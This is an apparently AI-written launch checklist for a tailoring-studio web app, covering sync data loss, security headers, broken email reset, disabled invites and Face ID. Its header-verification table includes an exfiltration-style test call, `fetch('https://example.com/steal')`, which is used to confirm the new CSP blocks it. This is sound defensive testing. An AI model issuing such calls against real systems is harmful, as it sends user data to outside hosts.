# Launch checklist

What "launch-ready" means, as a finite list. Read from the shipped code, the
live database and the live Netlify config on 5 October 2026. The audit
itself was read-only: nothing was changed to produce it.

**This file is now kept current as items close** — status, the release it
shipped in, and how it was verified. Last updated 5 October 2026, after
steps 0 to 3. One blocker is closed, two findings got worse once they were
run rather than read, and three decisions are waiting with Kayode rather
than with work.

**S** = under a day. **M** = a few days. **L** = a week or more.

---

## The short version

**Eleven blockers.** One of them is the spine: **a real studio cannot give
anybody else an account**, so every role, every permission and the whole
money boundary built over the last fortnight are unreachable in practice.
Two are about losing work, and they share one cause. Two are security
defaults the app never got. The rest are money being wrong or a screen
promising something that cannot happen.

The thing I did not expect to find: **the app had no security headers at
all** — no CSP, no X-Frame-Options — while the admin console, the partner
portal and the marketing site all had them. The app is the one holding
clients' measurements and photographs. **That one is now closed** (B3), and
the way it closed is its own lesson: the headers were first shipped into a
`netlify.toml` the live site does not read, the gate read the same wrong
file and passed, and the deploy changed nothing a browser could see.

What has changed since the audit, in one paragraph: **B3 is done and live.**
**B6 moved from "unverified" to "has never worked once"** — the password
reset path posts to Resend and silently reports success when the API key is
missing, and the live project records one reset ever requested and zero
emails ever sent. **B11's cause is confirmed and the cheap fix turned out
not to exist** — making the Face ID promise honest needs a lock screen over
the auto-restored session, which is a boot-path change, not a two-line one.

| # | Cat | Blocker | Effort | Status |
|---|---|---|---|---|
| B1 | 1 | 14 synced keys are last-write-wins over a whole array | L | open — step 5 |
| B2 | 1 | Unsynced offline edits are replaced on reconnect (same cause as B1) | — | open — step 5 |
| B3 | 2 | No security headers on the customer app: no CSP, framable | S | **CLOSED** — `layi-v71` + `eb80c86` |
| B4 | 2 | No in-app privacy policy or terms, and no DPA for studios | M | open — documents with Kayode |
| B5 | 2 | Leaked-password protection is off on production Auth | S | **confirmed available on Pro and off.** One toggle, and it is yours |
| B6 | 2 | Email delivery unconfirmed — password reset depends on it | S to check | **worse than first listed.** See B6 |
| B7 | 3 | Material cost never reaches an order, so margin is overstated | L | database half built, applied nowhere — step 5 |
| B8 | 3 | Money In by channel reports every payment as "Studio" | M | open — step 6 |
| B9 | 3 | Two payment forms, two different method lists | S | open — step 6 |
| B10 | 4 | Team invitations are off — only the owner can have an account | M–L | open — step 4, design first |
| B11 | 4 | Face ID unlock can never work on the live app | S → M | **cause confirmed, and the S option does not exist.** See B11 |
| B12 | 4 | Stock-used recipes can never be applied | M | open — step 6 |


---

## How each finding was verified

Asked for at step 0, because "I read the code and it looks wrong" and "I ran
it and it is wrong" are not the same claim, and a checklist that blurs them
is not worth acting on.

**Verified by running something** — a query against the live or staging
database, a gate, or a probe that signs in and asks the API.

| Finding | What was run |
|---|---|
| B3, no security headers | `curl -I` against all four live sites on 5 October. The customer app returned HSTS and nothing else; the other three returned their own folder's headers |
| B5, leaked-password protection | The Supabase advisor `auth_leaked_password_protection` on the live project, plus the organisation's plan |
| B6, email delivery | The live `auth_recover` audit rows, the deployed function's source, and the email log: **one** reset ever requested, on 13 September, and **zero** confirmation emails ever sent |
| Roles and the money boundary | `tools/money_role_probe.js` — five real staging sessions, 77 checks, re-run on 5 October. Result below |
| Storage is real but unused | Object count on the live `studio-media` bucket: 0 |
| Import never used by a live studio | Zero `historical` orders, zero imported payments and zero import audit entries across all nine studios |
| `payment_methods`, `plan_state_keys`, `referral_attempts` are not leaks | Read with the publishable key against production: refused |
| Nightly backups exist and run | `cron.job` and `cron.job_run_details` on the live project: `nightly-studio-backups`, `40 2 * * *`, two successful rounds, 18 copies over 9 studios |
| The production figures are the demo seed counted twice | md5 fingerprints over order ids and prices, and over every material, matched between Adé Bespoke and Seed Multi Studio |
| B11, Face ID | `git log -S` dated the guard to commit `e0273d6` on 29 September, and the version live immediately before it was `layi-v61`. Then read in the browser on the live site |
| B7, item 1's database half | `supabase/tests/materials_harness.mjs`, 62 checks, and a migration dry run crossing all 48 live materials with their opening averages |

**Verified by reading code only.** No query could answer these, because they
are about what the shipped file does and does not call.

| Finding | Why reading was the whole answer |
|---|---|
| B1, B2, the fourteen last-write-wins keys | `pushState` and `_pushStateDirect` upsert a whole blob keyed on `business_id,key`, and `hydrateFromCloud` calls `saveLocal(r.key, r.data)`. The loss happens between two devices and no stored row records it afterwards |
| B12, recipes have no call site | `applyRecipesToOrder()` exists and nothing calls it. A database cannot be asked whether a function is reachable |
| B8, channel on the order | `IN_CHANNELS` is a fixed list and no payment carries the order's channel |
| B9, two method lists | `IN_METHODS` is used in exactly one place and `PAY_METHODS` in the other |
| B10, invitations off | `TEAM_INVITES_ENABLED = false` |
| B4, no in-app policy | There is no such screen to query |
| Automatic WhatsApp, Notifications, Install as app, Plan | The verdict in each case is what the copy promises measured against what the code does |

### The five-role probe, re-run on 5 October

`node tools/money_role_probe.js` — **77 checks, 0 failed.** Five real
staging sessions through the existing `as-user` path, asking PostgREST
directly with no app anywhere in the line.

| Role | Order | Price | Paid | Cost | Commission | Contact | Margin |
|---|---|---|---|---|---|---|---|
| OWNER | yes | yes | yes | yes | yes | yes | **yes** |
| ACCOUNTANT | yes | yes | yes | yes | yes | yes | **yes** |
| HEAD PRODUCTION | yes | refused | refused | refused | refused | yes | **no** |
| STAFF | yes | refused | refused | refused | refused | yes | **no** |
| VIEWER | yes | yes | refused | refused | refused | refused | **no** |

Four things the probe establishes that hiding a control in the app could
never have:

- **A refused table does not arrive on the back of a permitted one.** The
  embedded read `orders?select=app_id,order_pricing(value)` is refused for
  the three roles without `money`, rather than handing back the order with
  the price attached.
- **The write side is a boundary too.** A `PATCH` to `order_pricing` from a
  role without `money` changes nothing, and the probe re-reads the figures
  afterwards rather than trusting the response code, because a zero-row
  write returns 204 with an empty body and that reads exactly like success.
- **The accountant cannot promote themselves.** Refused writes to the studio
  settings, to ownership, to their own permissions, and to deleting the role
  out from under the books.
- **Margin needs both halves, and neither of them is a field.** A role
  holding `money` without `seeCost`, or the reverse, cannot arrive at a
  margin at all. There is no column to blank out.

**Nothing is asserted from a role name.** Every expectation is read out of
`business_role_permissions` through the API first, because the defaults are
not what a reasonable person guesses — a manager does not hold `seeCost`,
and a staff member does hold `seeContact`. Writing the answers in by hand is
how a probe ends up asserting that a bug is correct.

The one thing this does **not** prove is that any of it is reachable. Five
roles enforced at the API and no way to give anybody a second account is
B10, and it is why B10 is first.

# BLOCKERS

## B1 — Fourteen synced keys are last-write-wins over a whole array
**Category 1, loses data. Effort: L.**

**What happens.** Every one of the 17 keys in `STATE_KEYS` is pushed to the
server as a whole blob: `pushState` queues the entire array
([:2801](site/layi_dashboard.html#L2801)) and the outbox upserts it with
`onConflict: 'business_id,key'` and **no revision check**
([:2812](site/layi_dashboard.html#L2812)). Coming back the other way,
`hydrateFromCloud` does `saveLocal(r.key, r.data)` — the cloud copy
**replaces** the device's whole array
([:3887](site/layi_dashboard.html#L3887)).

Orders and payments were fixed in v64–v66: they are rows, they carry `rev`,
and a conflicting write is detected and surfaced. Those three keys are
explicitly excluded from the blob hydrate. **Nothing else was fixed.**

Still exposed: `layi_dash_staff` (team and pay), `layi_dash_products`,
`layi_dash_supplies` (stock), **`layi_dash_bills` (expenses)**, **`layi_dash_pots`
(funds)**, `layi_dash_attendance`, `layi_dash_leave`, `layi_dash_shifts`,
`layi_dash_appts` (diary), `layi_dash_tasks`, `layi_dash_anns`,
`layi_dash_campaigns`, `layi_dash_log`, `layi_dash_settings`.

**User impact:** an owner who adds a staff member on their laptop and logs
an expense on their phone loses one of the two, with no error and no
conflict shown — and two of those keys are the studio's money.

**Why it is not already causing incidents:** invitations are off (B10), so
most studios have exactly one account. One person with a phone and a laptop
is still enough.

**Note:** this is the same table and the same shape the order money came out
of. The fix is the same shape too — rows with a revision, or a per-key
merge. Phase 1 item 1 already moves `layi_dash_supplies` out, so that is one
of the fourteen done.

## B2 — Unsynced offline edits are replaced on reconnect
**Category 1, loses data. Effort: folded into B1.**

Same cause, different moment. The outbox survives a closed tab
([:2822](site/layi_dashboard.html#L2822)), which is right, but
`hydrateFromCloud` overwrites local arrays on every sign-in and reconnect
independently of whether the outbox has drained. An edit that never reached
the outbox is gone; one that did will win and destroy the other device's.
Either way somebody's afternoon disappears.

**User impact:** a tailor edits stock in a workroom with no signal, the
signal returns, and either their change or the office's is silently lost.

## B3 — No security headers on the customer app
**Category 2, leaks data. Effort: S. CLOSED 5 October, in `layi-v71` and the
config fix `eb80c86`.**

### What was wrong

`netlify.toml` for `site/` held a publish directory and one redirect and
nothing else, and there was no `_headers` file anywhere in the repository.
So the app every studio signs into had **no Content-Security-Policy** — the
app itself recorded that at [:10781](site/layi_dashboard.html#L10781) —
**no X-Frame-Options**, no Referrer-Policy and no Permissions-Policy, while
the admin console, the partner portal and the marketing site all had theirs.
The customer app is the only one of the four holding clients' names,
addresses, phone numbers, measurements and photographs.

### What shipped

`site/netlify.toml` now sets, for every path:

- `Content-Security-Policy` with `frame-ancestors 'none'`, `object-src
  'none'`, `base-uri 'self'`, `form-action 'self'`, `worker-src 'self'` and
  a `connect-src` carrying exactly the origins the app talks to
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: no-referrer`
- `Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()`

**What this buys and what it does not.** `script-src` carries
`'unsafe-inline'` because it has to: the app is one file with roughly 691
lines carrying `onclick` / `oninput` / `onchange` attributes, and a nonce
cannot cover an attribute. So the policy does **not** stop injected inline
script. Moving every handler to `addEventListener` is real work and belongs
on the after-launch list. What it does stop is the two things that actually
hurt here: `frame-ancestors 'none'` takes clickjacking a signed-in studio
off the table, and `connect-src` means an injected script cannot post a
studio's client list, measurements or photographs to an address of its
choosing. Exfiltration is the whole point of stealing this data.

`publickey-credentials-get` is deliberately **not** restricted, because
setting it to `()` would break biometric unlock before it is even fixed.
`camera=()` is safe because photos arrive through `<input type="file">`,
which that directive does not gate, and nothing calls `getUserMedia`.

### The part worth remembering

**The headers were first shipped into a file the live site does not read,
the gate passed, and nothing was served.** `layi-v71` put the block in the
root `netlify.toml`; `audit_headers.js` read that same file and reported 35
green; the deploy went out; `APP_VERSION` and the service worker on
`app.thelabelboard.com` both read `layi-v71`; and the live response carried
HSTS and not one other header.

Every app folder's `netlify.toml` says `publish = "."`, which only resolves
when the Netlify site has a base directory set — so each of the four sites
reads **its own folder's** file and the root one is never read at all. The
live responses had been saying so and were not checked until after the
deploy: `thelabelboard.com` serves `web/netlify.toml`'s `SAMEORIGIN` and
`strict-origin-when-cross-origin` rather than the root file's `DENY` and
`no-referrer`, and the partner portal serves `partners/netlify.toml`'s.

So the block moved to `site/netlify.toml`; the root copy is kept as a mirror
because that is the copy the docs describe and a merge from `admin-deploy`
could bring either one forward; and `audit_headers.js` now reads **the file
the site reads** and fails if the two copies disagree. 35 checks to 39. A
gate that reads the wrong file proves nothing, and this one proved nothing
for half an hour.

**This also puts a question mark over the `admin-deploy` merge warning** in
`CLAUDE.md` and in both copies of `netlify.toml`, which says a clean merge
would make the customer app's site serve the operator console. If the root
file is never read, that cannot happen the way it is described. Worth
settling from the Netlify dashboard rather than from another guess.

### How it was verified

**Live, on `app.thelabelboard.com`, after the deploy:**

| Checked | Result |
|---|---|
| All five headers served | `curl -I`, cache-busted, on the app, on `sw.js` and on the manifest |
| Service worker still registers | `sw.js` **activated** at scope `/`. This is the one that could not be tested before the deploy: it fails in the preview harness over plain `http` with the policy removed too, so the harness was the cause and not the CSP |
| Fonts | 48 font faces loaded |
| Supabase client from jsdelivr | Loaded |
| Sync reachable | `HTTP 401` from the auth health endpoint, which is reached-and-unauthenticated rather than refused |
| **Exfiltration blocked** | `fetch('https://example.com/steal')` fails. This is the line doing the work |
| Import with SheetJS | `xlsx@0.18.5` loaded on demand, with its SRI hash |
| Photo upload | A `data:` image renders, which is the inline preview before upload, and the upload target is in `connect-src`, proven by the line above |
| Biometric | `document.featurePolicy.allowsFeature('publickey-credentials-get')` is `true`, so the policy has not closed the door WebAuthn will need |
| Framing | `frame-ancestors 'none'` plus `X-Frame-Options: DENY` |

**PDF and print could not be driven in the browser pane**, which blocks
pop-ups, so it was established from the code instead, and the answer is
solid. Invoices, receipts and payslips open `window.open('','_blank')` and
`document.write` into it. An `about:blank` window inherits the opener's
policy, and the written document loads **no external origin at all**:
`invoiceInner` and `payslipInner` were checked for every URL and every `src`
shape, and their images are either `data:` URLs (`readAsDataURL` for the
logo and the signature, `BLANK_PX` for a gap) or signed `supabase.co`
storage URLs. Both are in `img-src`, the inline `<style>` is covered by
`style-src 'unsafe-inline'`, and there is no script, font or stylesheet in
it to refuse. **Still worth one real print from a phone** at the next
sitting, to close it by observation rather than by reading.

`frame-src 'none'` costs nothing: the app contains **zero** iframes, and the
free video room is a `meet.jit.si` link opened in a new tab, which no
directive in this policy touches.

### Gates

`node audit_headers.js` — 39 checks, registered in `verify.js`, which runs
25 gates and is green. `tools/csp_preview.js` serves `site/` under the
policy parsed out of the file that ships, with `NO_CSP=1` to tell a real
refusal apart from a preview artefact.

## B4 — No in-app privacy policy or terms, and no DPA for studios
**Category 2, NDPR. Effort: M.**

The marketing site is in good shape: `web/privacy.html` draws the
controller/processor distinction explicitly, names measurements among the
records a studio keeps, sets retention periods, and states NDPR access,
correction, deletion and portability rights with a thirty-day response.
`web/terms.html` exists.

What is missing:

- **Nothing in the app links to either.** A grep of
  `site/layi_dashboard.html` for "privacy" or "terms" finds only a
  studio's own payment-terms field.
- **There is no acceptance step.** A studio starts processing their clients'
  personal data without ever being shown the terms.
- **There is no data processing agreement.** The privacy policy itself says
  *"we are the data processor for the records your business keeps inside the
  app"*. Under the NDPA a processor needs an agreement with each controller.
  Every studio is a controller. There is no such document anywhere in the
  repository.

**User impact:** studios process clients' personal data — including
measurements and photographs of people — with no agreement in place and no
visible policy, which is the studio's exposure as much as ours.

**The export and deletion halves are built**, which is worth saying:
`export_studio` gives a studio its whole record, and
`request_account_deletion` / `confirm_account_deletion` /
`delete_my_account` exist with a `lifecycle_harness` behind them. It is the
paperwork and the linking that is absent, not the capability.

## B5 — Leaked-password protection is off on production Auth
**Category 2. Effort: S. Confirmed again on 5 October; still off.**

The Supabase advisor `auth_leaked_password_protection` returns WARN on the
live project, re-read today. Compromised passwords are not checked against
HaveIBeenPwned.

**It is available on our plan.** The organisation is on **Pro**, and leaked
password protection is a Pro feature, so there is nothing to buy: it is one
dashboard toggle under Authentication, Passwords.

**User impact:** the owner account is the only account most studios have,
and it can be set to a password that is already in a public breach corpus.

**Left for you deliberately.** It is a live-settings change on production
Auth, and the instruction was not to change any setting.

## B6 — Nothing has ever confirmed that auth email leaves the building
**Category 1 and 2. Effort: S to establish. Worse than it first read.**

First listed as "unverified". Having looked, it is worse than that, and the
reason is one line of the Edge Function.

`forgotPassword()` ([:5000](site/layi_dashboard.html#L5000)) deliberately
uses our own `auth-recover` Edge Function rather than Supabase's mailer.
That function does not send through Supabase SMTP at all — **it posts to the
Resend HTTP API**. And when `RESEND_API_KEY` is not set in the function's
environment, it **returns success to the caller and sends nothing**. A
studio is told to check their inbox and no mail was ever attempted.

What the live project says:

- **one** password reset has ever been requested, on **13 September**
- **zero** confirmation emails have ever been sent
- `auth-recover` was deployed on **29 September**, so nothing has gone
  through the path that is live today, not once
- the project notes still carry "SMTP / email spam" as an open task, dated
  13 September

So the state is not "probably fine, unverified". It is **a delivery path
that has never delivered anything, with a failure mode that looks like
success from the app.**

**User impact:** a studio that forgets its password is locked out of its own
business records with no self-service route back, and is told the email is
on its way. The same channel is what invitations will need (B10), so this
gates that too.

**What closes it:** confirm `RESEND_API_KEY` is set on production, confirm
the sending domain is verified at Resend, then send one real reset to a
Gmail address and one to a Yahoo address and watch both arrive outside spam.
Make `auth-recover` return a failure when the key is missing, so the app can
tell the studio the truth. That last part is a code change and is the only
engineering in it.

**Cost:** Resend's free tier is 3,000 emails a month with a **hard cap of
100 a day** — the daily cap is the real limit, since 100 a day is about
3,000 a month anyway — plus one verified domain and 30 days of log
retention. Sending pauses when the cap is hit. That is far beyond an
invite-only pilot: a reset and an invitation each cost one email. The first
paid tier is **$20 a month** for 50,000. **Nothing needs buying to launch.
The domain needs verifying and the key needs setting.** Checked 5 October
2026.

## B7 — Material cost never reaches an order, so margin is overstated
**Category 3, gets money wrong. Effort: L. (Phase 1 items 1–2, as agreed.)**

When stock is used on an order the deduction is real — the quantity comes
off the material and a movement is logged against the order reference
([:7362](site/layi_dashboard.html#L7362)) — but **no cost is written to the
order**. The only material cost an order has is the hand-typed list beside
the stock picker.

**User impact:** every bespoke order that consumed materials reports a
margin higher than the truth, by exactly the cost of the cloth. The section
note reads "nothing recorded" next to a populated stock list.

**State:** item 1's database half is **built and gated** — four tables, cost
behind `seeCost`, the perpetual moving average, the migration, a 62-check
harness, and a dry run showing all 48 live materials crossing with their
opening averages. Committed, applied nowhere. Item 1's app half and item 2
remain, with the four decisions you have now given.

## B8 — Money In by channel reports every payment as "Studio"
**Category 3, gets money wrong. Effort: M. (Phase 1 item 5.)**

Orders and sales have **no channel field at all** — `draft.channel` is never
written anywhere in the file, and the order form has no such input.
`txnChannel` ([:9096](site/layi_dashboard.html#L9096)) therefore falls
through: "Website" if the order came from the website, "Studio" if
`o.channel` happens to be `showroom`, **and "Studio" for everything else.**
And a payment logged in the app never records a channel either
([:8429](site/layi_dashboard.html#L8429)), so the explicit branch is only
ever taken by imported payments.

**User impact:** the channel report is not approximately wrong, it is
uniformly wrong. A studio reading it would conclude every naira came from
the showroom and cut its Instagram spend on that basis.

## B9 — Two payment forms offer two different method lists
**Category 3, gets money wrong. Effort: S. (Decision 3, agreed.)**

`openPayment` uses `PAY_METHODS` — the studio's own editable list from
Settings → "How you get paid", seven entries
([:8422](site/layi_dashboard.html#L8422)). The other payment form uses
`IN_METHODS`, hardcoded, four entries
([:9136](site/layi_dashboard.html#L9136)), and it is the **only** place
`IN_METHODS` is used.

**User impact:** a studio that adds "Mobile money" in Settings sees it on
one payment screen and not the other, so the same payment is recorded
differently depending on where it was entered, and method totals mix two
vocabularies.

## B10 — Team invitations are off: only the owner can have an account
**Category 4, claims something that doesn't work. Effort: M–L.**

`TEAM_INVITES_ENABLED = false`
([:16116](site/layi_dashboard.html#L16116)). The owner is told honestly
("Temporarily unavailable"), and the reason is recorded in the code:
inviting somebody currently makes them the **owner of a brand new studio
named after them**, because the provisioning trigger cannot attach an
account to a business that already exists. `public.team_invitations` has RLS
enabled and no policy, so it is deny-all.

**User impact:** The Label Board is sold as a studio operating system with
roles, branch scope and permissions. A real studio cannot put a second
person in it. Everything built over the last fortnight — the five roles, the
`seeCost` boundary, the `receivables` boundary, branch scope, the accountant
role standardised across nine studios — is **unreachable for any real
studio**, because there is nobody to hold a role but the owner.

**This is the spine of the list.** Nothing else on it changes what a studio
can actually do as much as this.

**State:** branch `phase-1b-team-invitations` is 1 commit ahead of main and
38 behind. `PHASE_1B_DESIGN.md` (25 September, design and audit only) says
*"Most of this is already built. The schema was designed for invitations and
then never wired up"*, verified against production at the time.
`public.accept_invitation` exists. The `team-admin` Edge Function exists,
is owner-gated, and already handles listing and editing.

## B11 — Face ID unlock can never work on the live app
**Category 4, claims something that doesn't work. Cause confirmed 5 October.
Effort: S to hide, M to make honest, M–L to make real.**

### The cause, with dates

`biometricUnlock()` refuses unless `localLoginAllowed()`
([:5775](site/layi_dashboard.html#L5775)), and that function is `!SUPA_URL`
— false on `app.thelabelboard.com`. So the unlock always ends at "Sign in
with your email address and password."

Meanwhile `renderBiometricSetting()`
([:5796](site/layi_dashboard.html#L5796)) enables the toggle on **any**
capable device with no such check, enrolment genuinely succeeds, the setting
reports "On for this device", and the button appears on the login screen.

`git log -S` dates both the guard and `localLoginAllowed` to commit
`e0273d6`, 29 September, *"P1: no authentication secret is reachable by
holding a membership"*. That shipped as **layi-v62**, and **layi-v61** was
live immediately before it. So biometric unlock worked up to and including
v61 and has been dead on the live app since v62 — which matches your test
exactly: *it worked for a while*.

### Your guess was the right shape and the wrong mechanism

You thought it was a device lock over a stored session, so signing out
removed the thing it unlocks. That would be the sensible design. It is not
what was there.

**The old one never unlocked a session at all.** It looked up a **local
account** in `getUsers()` and set `currentUser` directly — no Supabase
session anywhere in it. That is precisely why the v62 credential fix killed
it: biometric unlock rode on the same local-account path as username/PIN
sign-in, which v62 correctly disabled on any install with a backend. It was
collateral damage, not a regression in biometrics.

So signing out is not what breaks it. It has been broken since v62 for
everyone on the live app, signed out or not.

### And the honest version is bigger than it looked

Step 3(b) asked for the button to appear only when there is a stored session
it can actually unlock. Looking at the boot path, **there is nowhere to put
that button.** The app auto-enters from a stored session
([:5642](site/layi_dashboard.html#L5642), *"Straight in, then check with the
server"*), and the login screen — the only place the unlock button lives —
is never seen by a returning signed-in user. Making the promise true means
introducing a **lock screen over an already-restored session**: a new boot
state that holds the app closed until the device check passes.

That is a boot-path change. Get it wrong and a studio cannot get into its
own records, which is the one failure worse than the current dishonesty.
**It was deliberately not bundled with the header release**, where the
worst case is reverting one config file.

### What was NOT shipped, and why

Nothing of step 3(b) is in `layi-v71`. Holding it is the recommendation, not
an omission: the four pieces asked for (show the button only when it can
work, the Settings line, the sign-out notice, the expired-session path) are
all downstream of deciding whether the app gets a lock screen at all.

### The three options, honestly

| Option | What a studio gets | Effort |
|---|---|---|
| **Hide it** | The toggle and the button disappear on any install with a backend. Nothing lies. Nobody gets Face ID | S |
| **Lock screen** | Face ID really does unlock the app while they stay signed in on that device, exactly as the Settings line would promise. A new boot state to get right | M |
| **Passkeys** | Face ID *is* the sign-in. Works after a sign-out, on a new device, with no password at all | M–L, and see below |

### Passkeys: available, and the design

Supabase does support server-verified passkeys — `signInWithPasskey()` and
`registerPasskey()` — so this is real rather than hypothetical. The
conditions:

- **Experimental**, and the client must opt in explicitly:
  `{ auth: { experimental: { passkey: true } } }`
- Needs `@supabase/supabase-js` **2.105.0 or newer**. The app loads a
  floating `@supabase/supabase-js@2` from jsdelivr **with no SRI hash**,
  which is worth pinning on its own merits
- Needs three project settings: `passkey_enabled`, `webauthn_rp_id` and
  `webauthn_rp_origins`
- **The RP ID is chosen once and never changed.** Changing it invalidates
  every passkey already enrolled, so `app.thelabelboard.com` has to be the
  answer before the first studio enrols. Setting it to `thelabelboard.com`
  instead would let the marketing site share the credential, which is not
  wanted

**Design.** Settings offers "Sign in with Face ID on this device", which
calls `registerPasskey()` against the signed-in user and stores nothing
locally. The login screen shows "Sign in with Face ID" whenever the browser
reports a platform authenticator, and `signInWithPasskey()` returns a real
Supabase session — so it survives a sign-out, works on a second device once
enrolled there, and never holds a password anywhere. Password sign-in stays
as the fallback, because a passkey is bound to a device and a studio that
loses its phone must still get in.

**My recommendation:** hide it now (S, honest, same release as anything
else), and build passkeys rather than the lock screen. The lock screen is
nearly as much work as passkeys and buys strictly less — it still needs a
password after every sign-out, which is the thing you noticed.

## B12 — Stock-used recipes can never be applied
**Category 4, claims something that doesn't work. Effort: M. (Phase 1 item 3.)**

`applyRecipesToOrder()` ([:6820](site/layi_dashboard.html#L6820)) is
written, correct, and **has zero call sites**. The slot where its button
belongs is `${recipesExist()?``:''}`
([:7166](site/layi_dashboard.html#L7166)) — an empty template that renders
nothing whichever way its own test goes, and has been that way since the
first commit in this repository.

The Settings panel it sits under is headed **"Stock used per product
(auto-deduct from inventory)"**
([:1545](site/layi_dashboard.html#L1545)).

**User impact:** a studio works through every garment type entering the
materials each one consumes, under a heading promising automatic deduction,
and nothing ever reads a single row of it.

---

## Checked in the sweep and NOT blockers

Worth recording, because three of these were on your list and they turned
out to be honest.

| Feature | Verdict |
|---|---|
| **Automatic WhatsApp updates** | Toggle saves and sends nothing — **and the copy says so**: *"Automatic sending needs a WhatsApp Business API sender connected to your live account… this switch just remembers your choice."* The token is only ever in an Edge Function, and no `send-whatsapp` function is deployed. A dormant seam that admits it. |
| **Notifications** | Honest. The panel ends with *"Sounds and pop-ups fire while the app is open."* `PUSH_PUBLIC_KEY` is empty so `subscribeToPush()` returns immediately — nothing half-built, nothing discarded. Only quibble: the button reads "Enable phone / desktop alerts", which over-promises slightly. After-launch copy fix. |
| **Storage** | Fully built. Photos upload to the `studio-media` bucket, records hold `sb:<path>` strings, signed URLs are cached so they survive offline, and inline data URIs are a deliberate transient state that `sweepInlinePhotos()` moves up when signal returns. Production holds 0 objects only because no studio has used it. |
| **Install as app** | Real. `beforeinstallprompt` on Android and desktop, a guided sheet on iPhone, and `navigator.storage.persist()` is requested, which is the right mitigation against browser eviction. |
| **Plan / Subscription** | Honest, and carefully so. The panel asks the server whether billing is `configured` and **hides the plan buttons when it is not**, on the stated grounds that "a button that apologises is worse than no button". Prices come from `plan_prices` server-side; the browser cannot suggest one. |
| **`payment_methods`, `plan_state_keys`, `referral_attempts` with RLS and no policy** | Not leaks. RLS enabled with no policy denies everything, and the app never reads any of the three. |
| **Import** | The four v67 bugs are fixed, and no live studio has ever used it: zero `historical` orders, zero imported payments, zero import audit entries across all nine studios. |
| **Close and reopen a studio** | `close_studio` and `reopen_studio` exist, are owner-gated, and `lifecycle_harness` covers close → reopen → purge → restore. |
| **Password reset** | Works, through our own `auth-recover` function rather than Supabase's mailer. Subject to B6. |

## Account lifecycle, end to end

| Step | State |
|---|---|
| Sign-up | **Operator-provisioned.** There is no sign-up form in the app; the marketing site collects an enquiry and an account is created for them. Fine for an invite-only launch, and worth deciding deliberately rather than by default. |
| Email verification | Supabase default. **Depends on B6.** |
| Password reset | Built and deployed. **Depends on B6.** |
| Inviting staff | **Off. B10.** |
| Roles | Built, gated and proven across five roles at the API — but unreachable while B10 stands. |
| Closing a studio | Built, owner-gated, harnessed. |
| Reopening | Built, harnessed. |
| Deleting an account | Built: preview, request, confirm, and a 30-day purge window. |

---

# AFTER LAUNCH

Not padding this. Everything here is real and none of it stops an outside
studio using the app safely.

**Flagged first, because it gates charging rather than using:** card payment
is not live. The Subscription panel correctly hides plan buttons until
Flutterwave is configured, so nothing lies — but **no studio can pay.** If
the first outside studios are paying customers this moves into the blocker
list; if they are free pilots it does not. Your call, and it is the one item
here I would not simply defer without deciding.

- **Phase 1 item 4 — the variance report.** Expected vs actual by date,
  product, material and staff, with a threshold. Needs items 1–3 first.
- **Phase 1 item 6 — one `code` field.** Today there are three: `sku` on
  shop products, `sku` on variants with **no input to set it**, `code` on
  product types, `code` on order lines, and `sku` on materials that only the
  CSV importer can write. No generation, no uniqueness, not searchable, and
  only the order line's own code is printed.
- **Shop products to rows.** `public.products` exists and holds zero rows.
  The product `cost` has exactly the problem the material cost had. Agreed
  as a later phase.
- **The duplicate example data.** Adé Bespoke and Seed Multi Studio hold
  byte-identical demo data (same fingerprints over order ids, prices and
  every material). Harmless, but every cross-studio figure is doubled, which
  will read as a bug in any report.
- **"Enable phone / desktop alerts"** should say what it does.
- **The seven empty shell studios** — one member each, a mid-September
  sign-in, two synced keys. Decide whether they are kept as fixtures or
  cleared.
- **`order_items` is unused** — zero rows, nothing in the app writes it, and
  it now sits behind `money` because it holds a price.
- **Self-serve sign-up**, if the invite-only model is not permanent.
- **Passkeys proper**, if B11 is fixed the cheap way now.
- **Push notifications**, if they are wanted at all — the service worker
  listener is already there.
- **Off-provider backups.** The nightly round lives inside the project it
  backs up; a destination decision (S3, R2, Backblaze) is still open.

---

# The order I would do them in

Where it stands on 5 October, after steps 0 to 3:

| Step | State |
|---|---|
| 0 — verify the audit | **Done.** The run-versus-read split is above, and the five-role probe was re-run: 77 checks, 0 failed |
| 1 — plan, email, backups | **Done, read-only.** Pro plan, nightly backups running, leaked-password protection available and off, and B6 turned out worse than first listed. Three settings decisions left with you |
| 2 — B3 security headers | **Done and live.** `layi-v71` plus `eb80c86`, verified against the live response |
| 3 — B11 biometric | **Cause confirmed, nothing shipped.** The honest version needs a boot-path change, which is the next decision |
| 4 — B10 invitations | Not started. Design first |
| 5 — B1, B2, B7 | Not started. The materials migration is committed and applied nowhere |
| 6 — B12, B8, B9 | Not started |
| B4 — documents | Yours. The placement advice and the personal-data inventory are still owed |

Three things are waiting on you rather than on work:

1. **Leaked-password protection** — one toggle, production Auth (B5)
2. **`RESEND_API_KEY` on production, and the verified sending domain** (B6)
3. **Which of the three biometric options** (B11)

And the original ordering, unchanged in its reasoning:

**1. B10, team invitations.** First, and not close. Everything built over
the last fortnight is theoretical until a studio can have a second person in
it, and every other fix on this list is easier to validate once more than one
account exists. It also decides how much B1 matters: single-account studios
mostly dodge the blob problem, multi-user ones cannot.

**2. B3, security headers.** ~~An afternoon~~ — **done, and it took an
afternoon plus a wrong file.** It closed the worst exposure on the list.

**3. B6, email delivery.** No longer ten minutes to establish: it is
established, and it has never worked. It gates both password reset and
invitations, so it must be real before B10 is built on top of it.

**4. B5, leaked passwords.** A toggle, confirmed available on Pro.

**5. B1 and B2, the blob problem.** The largest piece and the one that
actually loses work. Phase 1 item 1 already takes `layi_dash_supplies` out
of it, so do the rest the same way, money keys first: `layi_dash_bills` and
`layi_dash_pots` before the diary.

**6. B7, material cost — Phase 1 items 1 and 2**, which are already agreed
and half built. Naturally bundled with step 5 because item 1 is one of the
fourteen keys.

**7. B12 then B8 then B9.** Recipes, then the channel, then the two method
lists. B12 shares the order form's stock section with B7, so they go
together. B9 is an hour.

**8. B11, Face ID.** Last of the blockers. I would **not** take the S option
blind: hide it in whichever release is next, and then build passkeys rather
than a lock screen, because the lock screen costs nearly the same and still
asks for a password after every sign-out.

**9. B4, the paperwork.** Runs in parallel with all of it and does not
depend on any of it, but it must land before the first outside studio, not
after. The DPA is the long pole and it is drafting rather than engineering.

The honest summary: **B10 is now the one that changes the answer to "could
we invite somebody on Monday"** — B3 was the other and it is closed. B6 is
the one that quietly moved from a check to a piece of work. B1 is the one
that will cost a studio real work if left.
